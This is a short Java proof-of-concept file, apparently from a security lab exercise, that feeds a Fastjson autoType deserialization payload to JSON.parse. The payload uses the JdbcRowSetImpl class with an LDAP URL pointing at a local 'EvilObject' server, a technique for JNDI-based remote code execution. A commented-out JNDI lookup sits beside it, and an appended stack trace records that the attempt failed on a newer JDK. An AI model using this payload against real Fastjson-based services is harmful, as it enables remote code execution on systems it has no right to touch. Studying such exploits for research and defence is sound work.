package BypassByLDAP;

import com.alibaba.fastjson.JSON;

import javax.naming.InitialContext;

public class VulnVictim {
    public static void main(String[] args) throws Exception {
//        new InitialContext().lookup("ldap://127.0.0.1:1234/EvilObject");
        String payload ="{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1234/EvilObject\",\"autoCommit\":\"true\" }";
        JSON.parse(payload);
        /*
        Failed.
        For the reason that JDK version is too high that doesn't support LDAP deserialization. :?
Exception in thread "main" com.alibaba.fastjson.JSONException: set property error, autoCommit
	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:109)
	at com.alibaba.fastjson.parser.deserializer.BooleanFieldDeserializer.parseField(BooleanFieldDeserializer.java:83)
	at com.alibaba.fastjson.parser.deserializer.ASMJavaBeanDeserializer.parseField(ASMJavaBeanDeserializer.java:74)
	at com.alibaba.fastjson.parser.deserializer.ASMJavaBeanDeserializer$InnerJavaBeanDeserializer.parseField(ASMJavaBeanDeserializer.java:86)
	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:330)
	at com.alibaba.fastjson.parser.deserializer.ASMJavaBeanDeserializer.parseRest(ASMJavaBeanDeserializer.java:100)
	at Fastjson_ASM_JdbcRowSetImpl_1.deserialze(Unknown Source)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parseObject(DefaultJSONParser.java:326)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1236)
	at com.alibaba.fastjson.parser.DefaultJSONParser.parse(DefaultJSONParser.java:1205)
	at com.alibaba.fastjson.JSON.parse(JSON.java:108)
	at com.alibaba.fastjson.JSON.parse(JSON.java:99)
	at BypassByLDAP.VulnVictim.main(VulnVictim.java:11)
Caused by: java.lang.reflect.InvocationTargetException
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:498)
	at com.alibaba.fastjson.parser.deserializer.FieldDeserializer.setValue(FieldDeserializer.java:106)
	... 12 more
Caused by: java.sql.SQLException: JdbcRowSet (connect) JNDI unable to connect
	at com.sun.rowset.JdbcRowSetImpl.connect(JdbcRowSetImpl.java:634)
	at com.sun.rowset.JdbcRowSetImpl.setAutoCommit(JdbcRowSetImpl.java:4067)
	... 17 more
         */
    }
}
